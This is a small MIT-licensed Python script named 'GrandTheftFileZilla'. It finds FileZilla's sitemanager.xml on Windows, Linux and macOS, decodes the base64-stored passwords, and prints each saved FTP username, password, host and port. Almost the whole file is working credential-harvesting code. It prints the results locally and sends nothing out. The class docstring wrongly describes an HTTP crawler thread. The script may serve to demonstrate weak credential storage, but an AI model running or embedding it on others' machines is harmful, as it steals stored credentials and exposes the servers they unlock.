# -*- coding: utf-8 -*-

# MIT License
#
# Copyright (c) 2017 Tijme Gommers
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import xml.etree.ElementTree
import base64
import sys
import os

print()

class GrandTheftFileZilla:
    """The crawler thread executes the HTTP request using the HTTP handler.

    Attributes:
        sitemanager_xml_locations (obj): All possible `sitemanager.xml` locations.
        __credentials (arr): Contains all the credentials (if found).

    """

    sitemanager_xml_locations = {
        "win": [
            os.path.join(os.environ["APPDATA"] if "APPDATA" in os.environ else "", "Roaming/FileZilla/sitemanager.xml"),
            os.path.join(os.environ["APPDATA"] if "APPDATA" in os.environ else "", "FileZilla/sitemanager.xml"),
            os.path.join(os.environ["CSIDL_APPDATA"] if "CSIDL_APPDATA" in os.environ else "", "FileZilla/sitemanager.xml")
        ],
        "linux": [
            os.path.expanduser("~") + "/.filezilla/sitemanager.xml",
            os.path.expanduser("~") + "/.config/filezilla/sitemanager.xml"
        ],
        "darwin": [
            os.path.expanduser("~") + "/.filezilla/sitemanager.xml",
            os.path.expanduser("~") + "/.config/filezilla/sitemanager.xml"
        ]
    }

    def __init__(self):
        """Constructs a GrandTheftFileZilla instance."""

        self.__credentials = []

    def extract_credentials(self, location):
        """Extract credentials from the given xml location and add them to the credentials array.

        Args:
            location (str): The location/filepath of the sitemanager XML file.

        """
        root = xml.etree.ElementTree.parse(location).getroot()
        for server in root[0].findall('Server'):
            self.__credentials.append((
                server.find('User').text,
                base64.b64decode(server.find('Pass').text).decode('utf-8'),
                server.find('Host').text,
                server.find('Port').text
            ))

    def get_credentials(self):
        """Iterate over the correct possible XML paths and extract and return the credentials."""

        for location_platform in self.sitemanager_xml_locations:
            if not sys.platform.startswith(location_platform):
                continue

            for location in self.sitemanager_xml_locations[location_platform]:
                if os.path.exists(location):
                    self.extract_credentials(location)

        return self.__credentials

if __name__ == "__main__":
    credentials = GrandTheftFileZilla().get_credentials()

    for (usernm, passwd, hostnm, portnb) in credentials:
        print(usernm + ":" + passwd + "@" + hostnm + ":" + portnb)
